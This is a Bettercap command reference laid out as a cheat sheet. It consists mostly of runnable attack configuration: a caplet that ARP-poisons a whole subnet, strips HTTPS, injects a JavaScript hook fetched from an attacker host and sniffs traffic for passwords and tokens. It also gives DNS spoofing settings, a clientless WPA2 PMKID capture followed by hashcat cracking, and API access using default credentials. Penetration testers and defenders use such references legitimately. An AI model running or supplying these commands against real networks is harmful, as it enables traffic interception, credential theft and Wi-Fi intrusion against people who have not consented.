# Bettercap — Module Reference & Caplet Syntax

## Module Reference

### Network Modules

| Module | Commands | Purpose |
|--------|----------|---------|
| `net.probe` | `on/off` | ARP probe all hosts; populates net.show |
| `net.show` | — | List discovered hosts with MAC/vendor |
| `arp.spoof` | `on/off` | ARP poisoning MITM |
| `net.sniff` | `on/off` | Capture credentials from traffic |
| `dns.spoof` | `on/off` | Spoof DNS responses |
| `http.proxy` | `on/off` | HTTP proxy with injection |
| `https.proxy` | `on/off` | HTTPS proxy with SSL strip |

### WiFi Modules

| Module | Commands | Purpose |
|--------|----------|---------|
| `wifi.recon` | `on/off` | Discover APs and clients |
| `wifi.show` | — | Display discovered APs/clients |
| `wifi.deauth` | `<mac/bssid>` | Deauthenticate target |
| `wifi.assoc` | `<bssid>` | Associate with AP (PMKID attack) |

### BLE Modules

| Module | Commands | Purpose |
|--------|----------|---------|
| `ble.recon` | `on/off` | BLE device discovery |
| `ble.show` | — | List BLE devices |
| `ble.enum` | `<mac>` | Enumerate services/characteristics |
| `ble.write` | `<mac> <uuid> <hex>` | Write to BLE characteristic |

## Key Parameters

### ARP Spoofing

```
set arp.spoof.targets 192.168.1.50       # specific target
set arp.spoof.targets 192.168.1.0/24     # whole subnet
set arp.spoof.duplex true                # poison both directions
set arp.spoof.whitelist 192.168.1.1      # exclude from spoofing
```

### HTTP/HTTPS Proxy

```
set http.proxy.address 0.0.0.0
set http.proxy.port 8080
set http.proxy.injectjs http://attacker:3000/hook.js
set https.proxy.sslstrip true
set https.proxy.certificate /path/to/cert.pem
```

### DNS Spoof

```
set dns.spoof.domains example.com,*.example.com,corp.local
set dns.spoof.address 192.168.1.100
set dns.spoof.all true    # spoof all DNS queries to address
```

### Net Sniff Filters

```
set net.sniff.filter tcp port 80 or tcp port 443
set net.sniff.regexp "password|pass|pwd|token"
set net.sniff.output capture.pcap
set net.sniff.verbose true
```

## Caplet Syntax

Caplets are plain text files with one command per line. Lines starting with `#` are comments.

```bash
# mitm_full.cap — full MITM + credential capture + JS injection

net.probe on
sleep 3

set arp.spoof.duplex true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

set http.proxy.injectjs http://192.168.1.100:3000/hook.js
http.proxy on

set https.proxy.sslstrip true
https.proxy on

set net.sniff.verbose true
net.sniff on
```

```bash
sudo bettercap -iface eth0 -caplet mitm_full.cap
```

## WiFi PMKID Attack (Clientless WPA2)

```
sudo bettercap -iface wlan0mon
wifi.recon on
# Wait for APs to appear
wifi.show
# Associate (captures PMKID, no client needed)
wifi.assoc <bssid>
# Handshake/PMKID saved to /tmp/bettercap-wifi-handshakes.pcap
```

Convert for hashcat:
```bash
hcxpcapngtool -o pmkid.hc22000 /tmp/bettercap-wifi-handshakes.pcap
hashcat -a 0 -m 22000 pmkid.hc22000 rockyou.txt
```

## REST API

```bash
# Enable web UI + API
sudo bettercap -iface eth0 -caplet http-ui
# UI: http://127.0.0.1:8081 (default creds: user/pass)

# API endpoint
curl -u user:pass http://127.0.0.1:8081/api/session \
  -H "Content-Type: application/json" \
  -d '{"cmd":"net.show"}'
```
